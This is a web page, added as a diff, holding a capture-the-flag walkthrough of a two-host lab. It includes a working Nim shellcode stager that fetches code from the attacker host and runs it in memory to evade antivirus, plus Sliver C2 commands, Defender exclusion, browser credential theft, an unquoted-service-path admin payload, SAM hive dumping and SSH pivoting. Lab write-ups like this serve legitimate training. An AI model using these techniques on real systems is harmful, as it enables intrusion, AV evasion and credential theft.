@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Staged - HackSmarter Labs CTF Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of Staged machine from HackSmarter Labs. Learn Sliver C2 shellcode staging, browser credential extraction, unquoted service path exploitation, GodPotato privilege escalation, and SSH pivoting techniques." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="Staged CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta property="og:description" content="Complete walkthrough covering Sliver C2 staged payloads, browser credential theft with SharpChrome, unquoted service path exploitation, GodPotato privilege escalation, and SSH pivoting to internal networks." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/staged/image-81.png" />
+  <meta property="og:url" content="https://z3rotrace.live/writeups/staged.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Staged CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
+  <meta name="twitter:description" content="Complete walkthrough covering Sliver C2 staged payloads, browser credential theft with SharpChrome, unquoted service path exploitation, GodPotato privilege escalation, and SSH pivoting to internal networks." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/staged/image-81.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Machine info box styling */
+    .machine-info {
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info ul {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .machine-info li {
+      margin-bottom: 0.25rem;
+    }
+
+    .machine-info li::before {
+      color: #00aaff;
+    }
+
+    /* Attack chain summary box */
+    .attack-chain {
+      background: rgba(199, 125, 255, 0.05);
+      border: 1px solid rgba(199, 125, 255, 0.25);
+      border-left: 4px solid #c77dff;
+      border-radius: 8px;
+      padding: 1rem 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+    }
+
+    /* Techniques table styling */
+    .techniques-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .techniques-table th,
+    .techniques-table td {
+      padding: 0.75rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 170, 255, 0.15);
+    }
+
+    .techniques-table th {
+      background: rgba(0, 170, 255, 0.08);
+      color: #00aaff;
+      font-weight: 600;
+    }
+
+    .techniques-table tr:last-child td {
+      border-bottom: none;
+    }
+
+    .techniques-table tr:hover {
+      background: rgba(0, 170, 255, 0.05);
+    }
+
+    /* Lessons learned styling */
+    .lessons-learned li {
+      margin-bottom: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="staged.html" aria-current="page">Staged - HackSmarter Labs</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <ul class="submenu" hidden>
+          <li><a href="../walkthroughs/sharethepain.html">ShareThePain</a></li>
+          <li><a href="../walkthroughs/sysco.html">Sysco</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>Staged - HackSmarter Labs CTF Walkthrough</h2>
+
+  <div class="machine-info">
+    <ul>
+      <li><strong>Platform:</strong> HackSmarter Labs</li>
+      <li><strong>Difficulty:</strong> Intermediate</li>
+      <li><strong>OS:</strong> Windows (web.hacksmarter) / Linux (sqlsrv.hacksmarter)</li>
+      <li><strong>Key Skills:</strong> Sliver C2, Shellcode Staging, Browser Credential Extraction, Unquoted Service Path, GodPotato, SAM/SECURITY Hive Dumping, SSH Pivoting</li>
+    </ul>
+  </div>
+
+  <h3>Objective / Scope</h3>
+  <p>This is a black-box penetration test against two hosts:</p>
+  <ul>
+    <li><strong>web.hacksmarter</strong> - Public-facing Windows web server (initial access point). Windows Defender is enabled.</li>
+    <li><strong>sqlsrv.hacksmarter</strong> - Internal Linux MySQL database server.</li>
+  </ul>
+  <p>The engagement is complete upon retrieving the final flag from <code>sqlsrv.hacksmarter</code>.</p>
+
+  <h3>Starting Point</h3>
+  <p>Another operator already exploited a file upload vulnerability and provided a web shell:</p>
+  <pre><code>http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami</code></pre>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <p>I started with a full port scan of the web server:</p>
+  <pre><code>$ nmap -p- -T4 -sC -sV -Pn web.hacksmarter -oN nmap_scan</code></pre>
+
+  <pre><code>PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
+| http-title: Welcome to XAMPP
+|_Requested resource was http://web.hacksmarter/dashboard/
+443/tcp  open  ssl/http      Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: EC2AMAZ-IBNMCK4
+|   Product_Version: 10.0.20348
+5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+
+  <div class="note">
+    <strong>Note:</strong> The <code>-oN</code> flag saves output in normal format.
+  </div>
+
+  <p>Key findings:</p>
+  <ul>
+    <li>XAMPP stack on Windows (Apache + PHP 8.0.30)</li>
+    <li>RDP enabled (port 3389)</li>
+    <li>WinRM enabled (port 5985)</li>
+  </ul>
+
+  <h3><span class="step">[Step 2]</span> Verifying Web Shell Access</h3>
+  <p>I navigated to the web shell URL to confirm RCE:</p>
+  <p><img src="../assets/staged/image-76.png" alt="Web shell confirming command execution" loading="lazy"></p>
+
+  <h2>Initial Access - Sliver C2 Stager</h2>
+
+  <p>Since Windows Defender is enabled, I needed to use a staged payload approach. The stager downloads shellcode into memory at runtime, making it harder for AV to detect.</p>
+
+  <div class="question">
+    <strong>What is a Stager?</strong>
+  </div>
+  <div class="answer">
+    A stager is a small payload that downloads and executes a larger payload (shellcode) in memory. This technique helps evade antivirus by keeping the malicious code off disk and fetching it dynamically at runtime.
+  </div>
+
+  <h3><span class="step">[Step 3]</span> Generate Shellcode and Start Listener</h3>
+  <p>In Sliver C2, I generated shellcode and started an mTLS listener:</p>
+  <pre><code>sliver > generate --mtls 10.200.27.205:443 --os windows --arch amd64 --format shellcode --save /tmp/shell.bin
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 34s
+[*] Implant saved to /tmp/shell.bin
+
+sliver > mtls -L 10.200.27.205 -l 443
+
+[*] Starting mTLS listener ...
+[*] Successfully started job #1</code></pre>
+
+  <div class="question">
+    <strong>What is mTLS?</strong>
+  </div>
+  <div class="answer">
+    Mutual TLS (mTLS) is a two-way authentication protocol where both client and server verify each other's certificates. In C2 frameworks like Sliver, mTLS provides encrypted, authenticated communication that blends in with legitimate HTTPS traffic.
+  </div>
+
+  <h3><span class="step">[Step 4]</span> Create the Nim Stager</h3>
+  <p>I compiled this Nim stager on a Windows VM. The stager fetches shellcode over HTTP and executes it in memory:</p>
+  <pre><code class="language-nim">import winim/lean
+import httpclient
+
+func toByteSeq*(str: string): seq[byte] {.inline.} =
+  @(str.toOpenArrayByte(0, str.high))
+
+proc DownloadExecute(url: string): void =
+  var client = newHttpClient()
+  var response: string = client.getContent(url)
+
+  var shellcode: seq[byte] = toByteSeq(response)
+  let tProcess = GetCurrentProcessId()
+  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
+  defer: CloseHandle(pHandle)
+
+  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](len(shellcode)), 0x3000, PAGE_EXECUTE_READ_WRITE)
+  copyMem(rPtr, addr shellcode[0], len(shellcode))
+
+  let f = cast[proc() {.nimcall.}](rPtr)
+  f()
+
+when defined(windows):
+  when isMainModule:
+    DownloadExecute("http://10.200.27.205:8080/shell.bin")</code></pre>
+
+  <div class="question">
+    <strong>Why Nim?</strong>
+  </div>
+  <div class="answer">
+    Nim compiles to native code and produces relatively small binaries. Its syntax differs significantly from C/C++, which can help evade signature-based detection that looks for common malware patterns. The <code>winim</code> library provides Windows API bindings.
+  </div>
+
+  <p>Compile with:</p>
+  <pre><code class="language-powershell">PS C:\> nim c -d:release --cpu:amd64 --os:windows stager.nim</code></pre>
+
+  <p><img src="../assets/staged/image-77.png" alt="Nim stager compilation output" loading="lazy"></p>
+
+  <h3><span class="step">[Step 5]</span> Transfer Stager to Attack Machine</h3>
+  <p>I set up an SMB server to transfer the compiled stager:</p>
+  <pre><code>$ impacket-smbserver sharename . -smb2support -username panos -password panos123</code></pre>
+
+  <p>Then connected from Windows and copied the file:</p>
+  <p><img src="../assets/staged/image-78.png" alt="Transferring stager.exe via SMB" loading="lazy"></p>
+
+  <h3><span class="step">[Step 6]</span> Host Payload Files</h3>
+  <p>I moved the shellcode to my working directory and started an HTTP server:</p>
+  <pre><code>$ mv /tmp/shell.bin .
+$ python3 -m http.server 8080</code></pre>
+
+  <h3><span class="step">[Step 7]</span> Upload and Execute Stager</h3>
+  <p>Using the web shell, I uploaded the stager with a URL-encoded PowerShell command:</p>
+  <pre><code class="language-powershell">powershell -ep bypass -c "iwr -uri http://10.200.27.205:8080/stager.exe -outfile C:\xampp\htdocs\hacksmarter\uploads\stager.exe"</code></pre>
+
+  <p>URL-encoded:</p>
+  <pre><code>powershell%20-ep%20bypass%20-c%20%22iwr%20-uri%20http://10.200.27.205:8080/stager.exe%20-outfile%20C:\xampp\htdocs\hacksmarter\uploads\stager.exe%22</code></pre>
+
+  <p><img src="../assets/staged/image-79.png" alt="Stager uploaded successfully" loading="lazy"></p>
+
+  <p>I executed the stager through the web shell, which fetched the shellcode:</p>
+  <p><img src="../assets/staged/image-80.png" alt="HTTP server showing shell.bin download" loading="lazy"></p>
+
+  <p>And received a Sliver session:</p>
+  <p><img src="../assets/staged/image-81.png" alt="Sliver session established" loading="lazy"></p>
+
+  <h2>Credential Harvesting</h2>
+
+  <p>Using SharpChrome from Sliver's armory, I extracted saved browser credentials:</p>
+  <pre><code>sliver (MYSTERIOUS_RECREATION) > sharpchrome logins /browser:Edge
+
+[*] AES state key file : C:\Users\j.smith\AppData\Local\Microsoft\Edge\User Data\Local State
+
+---  Credential (Path: C:\Users\j.smith\AppData\Local\Microsoft\Edge\User Data\Default\Login Data) ---
+
+file_path,signon_realm,origin_url,date_created,times_used,username,password
+...,https://hacksmarter.org/,https://hacksmarter.org/,...,b.morgan,O3KA6B#y1$15</code></pre>
+
+  <div class="question">
+    <strong>What is SharpChrome?</strong>
+  </div>
+  <div class="answer">
+    SharpChrome is a .NET tool that decrypts saved credentials from Chromium-based browsers (Chrome, Edge, Brave). It extracts the AES encryption key from the browser's Local State file and uses it to decrypt passwords stored in the Login Data SQLite database.
+  </div>
+
+  <p>Credentials found: <code>b.morgan:O3KA6B#y1$15</code></p>
+
+  <h3><span class="step">[Step 8]</span> RDP Access</h3>
+  <p>With these credentials, I established an RDP session:</p>
+  <pre><code>$ xfreerdp /u:b.morgan /p:'O3KA6B#y1$15' /v:web.hacksmarter</code></pre>
+
+  <p><img src="../assets/staged/image-82.png" alt="RDP session as b.morgan" loading="lazy"></p>
+
+  <h2>Privilege Escalation</h2>
+
+  <h3><span class="step">[Step 9]</span> Finding the Vulnerability</h3>
+  <p>I enumerated for unquoted service paths:</p>
+  <pre><code class="language-powershell">PS C:\> cmd /c 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""'
+
+Note Taking Service    NoteTakingSvc    C:\Program Files\Note Taking App\notes.exe    Auto</code></pre>
+
+  <p><img src="../assets/staged/image-83.png" alt="Unquoted service path discovery" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is an Unquoted Service Path?</strong>
+  </div>
+  <div class="answer">
+    <p>When a Windows service path contains spaces and is not enclosed in quotes, Windows searches for executables at each space boundary. For <code>C:\Program Files\Note Taking App\notes.exe</code>, Windows checks in order:</p>
+    <ol>
+      <li><code>C:\Program.exe</code></li>
+      <li><code>C:\Program Files\Note.exe</code></li>
+      <li><code>C:\Program Files\Note Taking.exe</code></li>
+      <li><code>C:\Program Files\Note Taking App\notes.exe</code></li>
+    </ol>
+    <p>If we can write to one of these locations, we can place a malicious executable that runs with the service's privileges.</p>
+  </div>
+
+  <p>I confirmed write access to the directory:</p>
+  <pre><code class="language-powershell">PS C:\> icacls "C:\Program Files\Note Taking App"
+C:\Program Files\Note Taking App EC2AMAZ-IBNMCK4\b.morgan:(OI)(CI)(F)</code></pre>
+
+  <p>The <code>(F)</code> indicates Full Control, meaning b.morgan can write to this directory.</p>
+
+  <h3><span class="step">[Step 10]</span> Exploiting the Service</h3>
+  <p>I created a simple C# payload to add b.morgan to the local administrators group:</p>
+  <pre><code class="language-csharp">using System;
+using System.Diagnostics;
+
+class Program
+{
+    static void Main()
+    {
+        try
+        {
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "cmd.exe";
+            psi.Arguments = "/c net localgroup administrators b.morgan /add";
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi);
+        }
+        catch { }
+    }
+}</code></pre>
+
+  <p>Compiled on the target using the built-in C# compiler:</p>
+  <pre><code class="language-powershell">PS C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:"C:\Program Files\Note.exe" /target:winexe addtoadmin.cs</code></pre>
+
+  <p>Triggered the service:</p>
+  <pre><code class="language-powershell">PS C:\> sc.exe start NoteTakingSvc</code></pre>
+
+  <p>Verified privilege escalation:</p>
+  <pre><code class="language-powershell">PS C:\> net localgroup administrators
+
+Alias name     administrators
+Members
+-------------------------------------------------------------------------------
+Administrator
+b.morgan
+The command completed successfully.</code></pre>
+
+  <h2>Dumping Credentials with GodPotato</h2>
+
+  <p>I ran into issues with Windows Defender when trying to dump credentials directly. To work around this, I added an AV exclusion path (requires accepting UAC since b.morgan is now a local admin):</p>
+  <pre><code class="language-powershell">PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Temp"</code></pre>
+
+  <p>Downloaded GodPotato:</p>
+  <pre><code class="language-powershell">PS C:\> iwr http://10.200.27.205:8080/GodPotato-NET4.exe -OutFile C:\Windows\Temp\gp.exe</code></pre>
+
+  <div class="question">
+    <strong>What is GodPotato?</strong>
+  </div>
+  <div class="answer">
+    GodPotato exploits the SeImpersonatePrivilege (commonly held by service accounts and IIS/web application pools) to escalate to SYSTEM. It abuses Windows COM/DCOM authentication mechanisms to trick the system into authenticating as SYSTEM, then impersonates that token. It works on modern Windows versions where older potato exploits (JuicyPotato, PrintSpoofer) have been patched.
+  </div>
+
+  <p>Verified SYSTEM access:</p>
+  <pre><code class="language-powershell">PS C:\> C:\Windows\Temp\gp.exe -cmd "whoami"
+nt authority\system</code></pre>
+
+  <p><img src="../assets/staged/image-84.png" alt="GodPotato confirming SYSTEM access" loading="lazy"></p>
+
+  <h3><span class="step">[Step 11]</span> Extracting SAM/SECURITY Hives</h3>
+  <p>I used esentutl (a legitimate Windows binary) to copy protected registry hives:</p>
+
+  <div class="question">
+    <strong>What is a LOLBIN?</strong>
+  </div>
+  <div class="answer">
+    Living Off The Land Binaries (LOLBINs) are legitimate, signed Windows executables that can be abused for malicious purposes. Using native tools helps evade detection since they are trusted by the OS and security software. <code>esentutl.exe</code> is the Extensible Storage Engine utility, normally used for database operations, but its <code>/y /vss</code> flags allow copying locked files via Volume Shadow Copy.
+  </div>
+
+  <pre><code class="language-powershell">PS C:\> C:\Windows\Temp\gp.exe -cmd "esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\Windows\Temp\sam"
+PS C:\> C:\Windows\Temp\gp.exe -cmd "esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\Windows\Temp\sys"
+PS C:\> C:\Windows\Temp\gp.exe -cmd "esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d C:\Windows\Temp\sec"</code></pre>
+
+  <p><img src="../assets/staged/image-85.png" alt="Esentutl extracting registry hives" loading="lazy"></p>
+
+  <h3><span class="step">[Step 12]</span> Extracting Hashes</h3>
+  <p>I transferred the hive files to my attack machine and used secretsdump:</p>
+  <pre><code>$ impacket-secretsdump -system sys -sam sam -security sec LOCAL
+
+[*] Target system bootKey: 0x...
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:eec92e27ca5d0858fbcd1ed83bac6fae:::
+j.smith:1002:aad3b435b51404eeaad3b435b51404ee:54cea054826ad7e3ed45bad5e0b7dc42:::
+b.morgan:1003:aad3b435b51404eeaad3b435b51404ee:663d2f33b8b2f806eadd9373fa78d8af:::
+p.richardson:1006:aad3b435b51404eeaad3b435b51404ee:c2c67b565cbf45f1c6b47c9d20ab138b:::</code></pre>
+
+  <div class="question">
+    <strong>What are SAM, SYSTEM, and SECURITY hives?</strong>
+  </div>
+  <div class="answer">
+    <p>These are Windows registry hive files:</p>
+    <ul>
+      <li><strong>SAM</strong> (Security Account Manager) - Contains local user account password hashes</li>
+      <li><strong>SYSTEM</strong> - Contains the bootkey needed to decrypt SAM hashes</li>
+      <li><strong>SECURITY</strong> - Contains cached domain credentials and LSA secrets</li>
+    </ul>
+    <p>You need both SAM and SYSTEM together to extract usable NTLM hashes.</p>
+  </div>
+
+  <h3><span class="step">[Step 13]</span> Cracking Hashes</h3>
+  <p>I cracked p.richardson's hash with hashcat:</p>
+  <pre><code>$ hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <pre><code>c2c67b565cbf45f1c6b47c9d20ab138b:^^CThacker66</code></pre>
+
+  <p>New credentials: <code>p.richardson:^^CThacker66</code></p>
+
+  <h2>Pivoting to Internal Network</h2>
+
+  <h3><span class="step">[Step 14]</span> Setting Up SSH Tunnel</h3>
+  <p>I established a reverse SSH tunnel from the Windows box to create a SOCKS proxy. First, I started an SSH server on my attack machine on a non-standard port:</p>
+  <pre><code>$ sudo systemctl start ssh
+# Or use a custom port with: ssh -p 2222</code></pre>
+
+  <p>Then from the Windows target:</p>
+  <pre><code class="language-powershell">> ssh -N -R 1080 kali@10.200.27.205 -p 2222</code></pre>
+
+  <p><img src="../assets/staged/image-86.png" alt="SSH tunnel established" loading="lazy"></p>
+
+  <div class="question">
+    <strong>What is a Reverse SSH Tunnel?</strong>
+  </div>
+  <div class="answer">
+    A reverse SSH tunnel creates an outbound connection from the target network back to your attack machine. The <code>-N</code> flag means no remote command (just forwarding), and <code>-R 1080</code> opens port 1080 on your attack machine as a SOCKS proxy. All traffic sent to localhost:1080 gets forwarded through the compromised Windows host to reach internal systems that are otherwise inaccessible.
+  </div>
+
+  <h3><span class="step">[Step 15]</span> Configuring Proxychains</h3>
+  <p>I added the SOCKS5 proxy to <code>/etc/proxychains4.conf</code>:</p>
+  <pre><code>[ProxyList]
+socks5  127.0.0.1 1080</code></pre>
+
+  <h2>Accessing the Database Server</h2>
+
+  <p>Using the tunnel, I connected to the internal MySQL server with p.richardson's credentials:</p>
+  <pre><code>$ proxychains mysql -h 10.1.193.157 -u p.richardson -p --skip-ssl
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.193.157:3306  ...  OK
+
+Enter password: ^^CThacker66
+
+Welcome to the MariaDB monitor.
+Server version: 10.6.22-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+MariaDB [(none)]></code></pre>
+
+  <h2>Flag</h2>
+
+  <p>I enumerated the database and retrieved the final flag:</p>
+  <pre><code class="language-sql">MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| hacksmarter_db     |
+| information_schema |
++--------------------+
+
+MariaDB [(none)]> use hacksmarter_db;
+
+MariaDB [hacksmarter_db]> show tables;
++--------------------------+
+| Tables_in_hacksmarter_db |
++--------------------------+
+| final_config             |
++--------------------------+
+
+MariaDB [hacksmarter_db]> select * from final_config;
++----+-----------------+----------------------------------------+
+| id | key_name        | key_value                              |
++----+-----------------+----------------------------------------+
+|  1 | admin_api_token | FLAG{}                                 |
+|  2 | system_status   | Operational                            |
++----+-----------------+----------------------------------------+</code></pre>
+
+  <h2>Summary</h2>
+
+  <p>This lab demonstrated a realistic red team engagement involving:</p>
+
+  <div class="attack-chain">
+    <ol>
+      <li><strong>Initial Access</strong> - Leveraged an existing web shell to deploy a Nim-based Sliver C2 stager, bypassing Windows Defender through in-memory shellcode execution</li>
+      <li><strong>Credential Harvesting</strong> - Extracted browser-saved passwords with SharpChrome from Sliver's armory</li>
+      <li><strong>Lateral Movement</strong> - Used harvested credentials for RDP access as b.morgan</li>
+      <li><strong>Privilege Escalation</strong> - Exploited an unquoted service path to gain local administrator privileges</li>
+      <li><strong>SYSTEM Access</strong> - Used GodPotato to escalate from local admin to SYSTEM</li>
+      <li><strong>Credential Dumping</strong> - Used esentutl (LOLBIN) to extract SAM/SECURITY hives and performed offline hash extraction with secretsdump</li>
+      <li><strong>Pivoting</strong> - Set up a reverse SSH tunnel to access the internal network through a SOCKS proxy</li>
+      <li><strong>Objective Completion</strong> - Accessed the internal MySQL database with cracked credentials and retrieved the final flag</li>
+    </ol>
+  </div>
+
+  <h3>Key Techniques</h3>
+
+  <table class="techniques-table">
+    <thead>
+      <tr>
+        <th>Phase</th>
+        <th>Technique</th>
+        <th>Tool/Method</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Initial Access</td>
+        <td>Staged Payload</td>
+        <td>Nim stager + Sliver shellcode</td>
+      </tr>
+      <tr>
+        <td>Credential Access</td>
+        <td>Browser Credential Theft</td>
+        <td>SharpChrome</td>
+      </tr>
+      <tr>
+        <td>Privilege Escalation</td>
+        <td>Unquoted Service Path</td>
+        <td>Custom C# binary</td>
+      </tr>
+      <tr>
+        <td>Privilege Escalation</td>
+        <td>Token Impersonation</td>
+        <td>GodPotato</td>
+      </tr>
+      <tr>
+        <td>Credential Access</td>
+        <td>Registry Hive Dumping</td>
+        <td>esentutl (LOLBIN)</td>
+      </tr>
+      <tr>
+        <td>Credential Access</td>
+        <td>Offline Hash Extraction</td>
+        <td>impacket-secretsdump</td>
+      </tr>
+      <tr>
+        <td>Pivoting</td>
+        <td>Dynamic Port Forwarding</td>
+        <td>Reverse SSH tunnel</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
